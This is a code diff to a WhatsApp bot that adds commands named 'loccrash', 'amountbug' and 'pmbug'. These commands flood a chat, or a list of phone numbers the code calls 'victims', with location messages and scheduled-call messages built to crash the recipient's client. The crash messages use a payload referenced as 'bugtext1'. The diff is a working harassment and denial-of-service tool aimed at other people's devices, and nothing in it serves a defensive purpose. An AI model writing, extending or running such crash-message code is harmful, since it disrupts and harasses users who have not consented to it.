@@ -1,5 +1,5 @@
 const { zokou } = require('../framework/zokou');
-const { delay, loading } = require("../bdd/utils")
+const { delay, loading, react } = require("../bdd/utils")
 const moment = require('moment-timezone');
 const conf = require('../set.js');
 const fs = require('fs');
@@ -112,42 +112,9 @@ docugcbug <grouplink>${mono}`;
   }
   );
 
-// amountbug
+
+//bug 
 zokou(
-  {
-    nomCom: 'amountbug',
-    categorie: category,
-    reaction: reaction
-  },
-  
-  async (dest, zk, commandOptions) => {
-    const { ms, arg, repondre, superUser } = commandOptions;
-    
-    if (!superUser) 
-      return await repondre(mess.prem);
-    if (!arg[0])
-      return await repondre(`Use ${conf.PREFIXE}amountbug amount\n> Example ${conf.PREFIXE}amountbug 5`);
-      
-    const amount = parseInt(arg[0]);
-    if (isNaN(amount) || amount > conf.BOOM_MESSAGE_LIMIT || amount < 1)
-      return await repondre(`use a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
-    for (let i=0; i < amount; i++) {
-      const bug = `${bugtext1}`;
-      var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
-scheduledCallCreationMessage: {
-callType: "2",
-scheduledTimestampMs: `${moment(1000).tz('Asia/Kolkata').format("DD/MM/YYYY HH:mm:ss")}`,
-title: bug,
-}
-}), { userJid: dest, quoted : ms});
-    zk.relayMessage(dest, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
-    await delay(3000);
-    }
-    await repondre(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`);
-  }
-  );
-  
-  zokou(
     {
       nomCom: 'bug',
       categorie: category,
@@ -177,6 +144,110 @@ title: bug,
             bugpdf,
          });
       }
-      zk.sendMessage(dest, {react: {text :'✅'}, key: ms.key});
+      await zk.sendMessage(dest, {react: {text :'✅', key: ms.key}});
     }
     );
+
+//loccrash
+zokou(
+    {
+      nomCom: 'loccrash',
+      reaction: '\uD83D\uDD16',
+      categorie: 'dev'
+    },
+    
+    async (dest, zk, commandOptions) => {
+      const { ms, arg, repondre, superUser} = commandOptions;
+      if (!superUser)
+        return await repondre(mess.prem);
+      await loading(dest, zk);
+      
+      for (let i = 0; i < 20; i++){
+        for(let j = 0;j < '3';j++) {
+          zk.sendMessage(dest, {
+            location: {
+            degreesLatitude: -6.28282828,
+            degreesLongitude: -1.2828,
+            name: 'BRUX0N3RD\n\n\n\n\n\n\n\n',
+          }
+          }, { quoted: ms});
+        }
+      }
+      await zk.sendMessage(dest, {react: {text :'✅', key: ms.key}});
+    }
+  );
+  
+// amountbug
+zokou(
+  {
+    nomCom: 'amountbug',
+    categorie: category,
+    reaction: reaction
+  },
+  
+  async (dest, zk, commandOptions) => {
+    const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+    
+    if (!superUser) 
+      return await repondre(mess.prem);
+    if (!arg[0])
+      return await repondre(`Use ${prefixe}amountbug amount\n> Example ${prefixe}amountbug 5`);
+      
+    const amount = parseInt(arg[0]);
+    if (isNaN(amount) || amount > conf.BOOM_MESSAGE_LIMIT || amount < 1)
+      return await repondre(`use a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
+    for (let i=0; i < amount; i++) {
+      const bug = `${bugtext1}`;
+      var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
+      "scheduledCallCreationMessage": {
+      "callType": "2",
+      "scheduledTimestampMs": `${moment(1000).tz('Asia/Kolkata').format("DD/MM/YYYY HH:mm:ss")}`,
+      "title": bug,}}), { userJid: dest, quoted : ms});
+    zk.relayMessage(dest, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+    await delay(3000);
+    }
+    await repondre(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`);
+    await react(dest, zk, ms, '✅');
+  }
+  );
+
+//pmbug
+zokou(
+  {
+    nomCom: 'pmbug',
+    categorie: category,
+    reaction: reaction
+  },
+  
+  async (dest, zk, commandOptions) => {
+    const { ms, arg, repondre, superUser, prefixe} = commandOptions;
+    if (!superUser)
+      return await repondre(mess.prem);
+    if (!arg[0] || !arg[1])
+      return await repondre(`Use ${prefixe}pmbug amount\n> Example ${prefixe}pmbug 30|${conf.NUMERO_OWNER}`);
+      await loading();
+    const amount = parseInt(arg[0]);
+    if (isNaN(amount) || amount > conf.BOOM_MESSAGE_LIMIT || amount < 1)
+      return await repondre(`use a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
+    const victims = arg.slice(1).split('|');
+    for (let i = 0; i < victims.length; i++){
+      const victim = victims[i]+'@s.whatsapp.net';
+      for (let j = 0; j < amount; j++){
+        const bug = `${bugtext1}`;
+        var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
+          "scheduledCallCreationMessage":{
+            "callType":"2",
+            "scheduledTimestampMs":`${moment(1000).tz('Asia/Kolkata').format("DD/MM/YYYY HH:mm:ss")}`,
+            "title": bug
+          }
+        }), {userJid: dest, quoted: ms});
+        zk.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+        await delay(3000);
+        await repondre(`*Successfully sent as many Bugs as ${amount} To ${victim}*`)
+      }
+      await delay(5000);
+    }
+    await repondre(`*Successfully sent as many Bugs as ${amount} To ${victims.join(',')} Please pause for 5 minutes*`);
+    await react(dest, zk, ms, '✅');
+  }
+  );
